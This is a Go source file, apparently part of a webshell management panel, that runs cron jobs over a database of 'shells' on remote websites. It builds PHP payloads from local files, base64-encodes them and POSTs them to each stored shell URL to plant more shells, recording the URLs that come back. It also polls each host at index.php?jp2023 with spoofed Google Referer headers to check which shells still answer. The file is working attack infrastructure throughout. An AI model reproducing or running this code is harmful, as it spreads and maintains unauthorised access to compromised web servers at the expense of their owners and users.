package task

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"

	"webadmin/model"

	"github.com/gocolly/colly/v2"
	"github.com/robfig/cron/v3"
)

type Resdata struct {
	Status int
	Url    []string
}

func StartCli() {
	c := cron.New()

	c.AddFunc("* * * * *", func() {
		fmt.Println("执行:", time.Now())
		AddMinone()
		AddMaxone()

	})

	c.AddFunc("0 * * * *", func() {
		fmt.Println("执行:", time.Now())
		AddMin()
		AddMax()

	})

	c.Start()
	select {}

}

func AddMinone() {
	var grup []model.ShellGroup
	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
		log.Printf("ShellGroup: : %v", err)
		return
	}
	var Grupadd []int
	for _, k := range grup {
		Grupadd = append(Grupadd, k.Id)
	}

	var shells []model.Shell
	if err := model.Db.Where("status < 2 and num=0 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	filePath := "./php/bakmin.php" // 要读取的文件
	// 1. 读取文件
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("读取文件失败:", err)
		return
	}
	filename := Getfile("min")
	//更换
	newData := bytes.ReplaceAll(data, []byte("#####"), filename)

	newData = append([]byte("?>"), newData...)
	// 2. Base64 编码
	encoded := base64.RawStdEncoding.EncodeToString(newData)
	for _, k := range shells {
		geturl, err := cleanURL(k.Maxurl)
		if err != nil {
			log.Println("url err:", err.Error())
			continue
		}
		filename := geturl + k.Minurl
		//fmt.Println("filename :", filename)
		body := postdata(filename, encoded)
		var resdate Resdata
		jsonrr := json.Unmarshal(body, &resdate)
		if jsonrr != nil {
			fmt.Println("jsonerr:", jsonrr.Error())
			continue
		}
		if len(resdate.Url) > 1 {
			//
			fmt.Println("url: ", resdate.Url)
			var addmins []model.ShellMin
			for _, resurl := range resdate.Url {
				var min model.ShellMin
				min.ShellId = k.Id
				min.Url = resurl
				min.Addtime = int(time.Now().Unix())
				min.Status = 1
				addmins = append(addmins, min)
			}
			model.Db.Create(addmins)
			result := model.Db.Model(&model.Shell{}).Where("id = ?", k.Id).Update("num", 1)
			if result.Error != nil {
				log.Println("update shell num err:", result.Error.Error())
				continue
			}
		}
	}

}

func AddMaxone() {
	var grup []model.ShellGroup
	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
		log.Printf("ShellGroup: : %v", err)
		return
	}
	var Grupadd []int
	for _, k := range grup {
		Grupadd = append(Grupadd, k.Id)
	}
	var shells []model.Shell
	if err := model.Db.Where("status < 2 and num=1 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	filePath := "./php/bakmin.php" // 要读取的文件
	// 1. 读取文件
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("读取文件失败:", err)
		return
	}
	filename := Getfile("max")
	//更换
	newData := bytes.ReplaceAll(data, []byte("#####"), filename)

	newData = append([]byte("?>"), newData...)
	// 2. Base64 编码
	encoded := base64.RawStdEncoding.EncodeToString(newData)
	for _, k := range shells {
		geturl, err := cleanURL(k.Maxurl)
		if err != nil {
			log.Println("url err:", err.Error())
			continue
		}
		filename := geturl + k.Minurl
		//fmt.Println("filename :", filename)
		body := postdata(filename, encoded)
		var resdate Resdata
		jsonrr := json.Unmarshal(body, &resdate)
		if jsonrr != nil {
			fmt.Println("jsonerr:", jsonrr.Error())
			continue
		}
		if len(resdate.Url) > 1 {
			//
			fmt.Println("url: ", resdate.Url)
			var addmins []model.ShellMax
			for _, resurl := range resdate.Url {
				var min model.ShellMax
				min.ShellId = k.Id
				min.Url = resurl
				min.Addtime = int(time.Now().Unix())
				min.Status = 1
				addmins = append(addmins, min)
			}
			model.Db.Create(addmins)
			result := model.Db.Model(&model.Shell{}).Where("id = ?", k.Id).Update("num", 2)
			if result.Error != nil {
				log.Println("update shell num err:", result.Error.Error())
				continue
			}
		}
	}

}

func AddMin() {
	var grup []model.ShellGroup
	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
		log.Printf("ShellGroup: : %v", err)
		return
	}
	var Grupadd []int
	for _, k := range grup {
		Grupadd = append(Grupadd, k.Id)
	}

	var shells []model.Shell
	if err := model.Db.Where("status < 2 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	filePath := "./php/bakmin.php" // 要读取的文件
	// 1. 读取文件
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("读取文件失败:", err)
		return
	}
	filename := Getfile("min")
	//更换
	newData := bytes.ReplaceAll(data, []byte("#####"), filename)

	newData = append([]byte("?>"), newData...)
	// 2. Base64 编码
	encoded := base64.RawStdEncoding.EncodeToString(newData)
	for _, k := range shells {
		geturl, err := cleanURL(k.Maxurl)
		if err != nil {
			log.Println("url err:", err.Error())
			continue
		}
		filename := geturl + k.Minurl
		//fmt.Println("filename :", filename)
		body := postdata(filename, encoded)
		var resdate Resdata
		jsonrr := json.Unmarshal(body, &resdate)
		if jsonrr != nil {
			fmt.Println("jsonerr:", jsonrr.Error())
			continue
		}
		if len(resdate.Url) > 1 {
			//
			fmt.Println("url: ", resdate.Url)
			var addmins []model.ShellMin
			for _, resurl := range resdate.Url {
				var min model.ShellMin
				min.ShellId = k.Id
				min.Url = resurl
				min.Addtime = int(time.Now().Unix())
				min.Status = 1
				addmins = append(addmins, min)
			}
			model.Db.Create(addmins)
		}
	}

}

func AddMax() {
	var grup []model.ShellGroup
	if err := model.Db.Where("status=?", 1).Find(&grup).Error; err != nil {
		log.Printf("ShellGroup: : %v", err)
		return
	}
	var Grupadd []int
	for _, k := range grup {
		Grupadd = append(Grupadd, k.Id)
	}
	var shells []model.Shell
	if err := model.Db.Where("status < 2 and group_id in ?", Grupadd).Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	filePath := "./php/bakmin.php" // 要读取的文件
	// 1. 读取文件
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("读取文件失败:", err)
		return
	}
	filename := Getfile("max")
	//更换
	newData := bytes.ReplaceAll(data, []byte("#####"), filename)

	newData = append([]byte("?>"), newData...)
	// 2. Base64 编码
	encoded := base64.RawStdEncoding.EncodeToString(newData)
	for _, k := range shells {
		geturl, err := cleanURL(k.Maxurl)
		if err != nil {
			log.Println("url err:", err.Error())
			continue
		}
		filename := geturl + k.Minurl
		//fmt.Println("filename :", filename)
		body := postdata(filename, encoded)
		var resdate Resdata
		jsonrr := json.Unmarshal(body, &resdate)
		if jsonrr != nil {
			fmt.Println("jsonerr:", jsonrr.Error())
			continue
		}
		if len(resdate.Url) > 1 {
			//
			fmt.Println("url: ", resdate.Url)
			var addmins []model.ShellMax
			for _, resurl := range resdate.Url {
				var min model.ShellMax
				min.ShellId = k.Id
				min.Url = resurl
				min.Addtime = int(time.Now().Unix())
				min.Status = 1
				addmins = append(addmins, min)
			}
			model.Db.Create(addmins)
		}
	}

}

func cleanURL(raw string) (string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", err
	}

	// 去掉 query
	u.RawQuery = ""

	// 去掉文件名，保留目录
	u.Path = path.Dir(u.Path)

	return u.String(), nil
}

func postdata(urls string, data string) (body []byte) {
	//urls := "http://127.0.0.107/admin.php"
	form := url.Values{}
	form.Set("test", data)
	// 4. 创建请求
	req, err := http.NewRequest(
		"POST",
		urls,
		bytes.NewBufferString(form.Encode()),
	)
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}

	// 5. 设置请求头
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", "https://www.google.com/")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

	// 6. 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("请求失败:", err)
		return
	}
	defer resp.Body.Close()

	// 7. 读取返回
	body, _ = io.ReadAll(resp.Body)
	return
}

func Getfile(mmtype string) (data []byte) {
	dir := "./php/max"
	if mmtype == "min" {
		dir = "./php/min"
	}
	var files []string

	// 遍历目录
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			files = append(files, path)
		}
		return nil
	})

	if err != nil {
		panic(err)
	}

	if len(files) == 0 {
		fmt.Println("没有文件")
		return
	}
	// 随机种子
	rand.New(rand.NewSource(time.Now().UnixNano()))
	randomFile := files[rand.Intn(len(files))]
	data, err = os.ReadFile(randomFile)
	if err != nil {
		panic(err)
	}
	return

}

// Sitestatus queries all shell records, visits scheme://host/jp2023 for each,
// base64
// http://127.0.0.107/admin.php
func AddMm() {
	time.Sleep(10 * time.Second) // delay start to allow server to initialize
	var shells []model.Shell
	if err := model.Db.Where("status = 1").Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	log.Printf("Sitestatus: %d records to check", len(shells))

	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
		colly.Async(true),
	)
	c.SetRequestTimeout(15 * time.Second)
	c.OnRequest(func(r *colly.Request) {
		r.Headers.Set("Referer", "https://www.google.com/")
		r.Headers.Set("Accept-Language", "en-US,en;q=0.9")
		r.Headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	})

	// limit concurrency to 10 parallel requests
	if err := c.Limit(&colly.LimitRule{
		DomainGlob:  "*",
		Parallelism: 10,
	}); err != nil {
		log.Printf("Sitestatus: failed to set limit: %v", err)
		return
	}

	c.OnResponse(func(r *colly.Response) {
		shellID := r.Ctx.GetAny("shellId").(int)
		bodyOk := strings.Contains(string(r.Body), "ok")

		newStatus := 2
		if bodyOk {
			newStatus = 1
		}

		if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", newStatus).Error; err != nil {
			log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
		}
	})

	c.OnError(func(r *colly.Response, err error) {
		if r != nil {
			shellID := r.Ctx.GetAny("shellId").(int)
			log.Printf("Sitestatus: request failed id=%d %s: %v", shellID, r.Request.URL, err)
			// set status=5 for failed requests
			if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", 5).Error; err != nil {
				log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
			}
		}
	})

	for _, shell := range shells {
		host := strings.TrimSpace(shell.Host)
		scheme := strings.TrimSpace(shell.Scheme)
		if host == "" || scheme == "" {
			log.Printf("Sitestatus: skip id=%d, empty host or scheme", shell.Id)
			continue
		}

		url := fmt.Sprintf("%s://%s/index.php?jp2023", scheme, host)
		ctx := colly.NewContext()
		ctx.Put("shellId", shell.Id)

		if err := c.Request("GET", url, nil, ctx, nil); err != nil {
			log.Printf("Sitestatus: visit failed id=%d %s: %v", shell.Id, url, err)
		}
	}

	c.Wait()
}
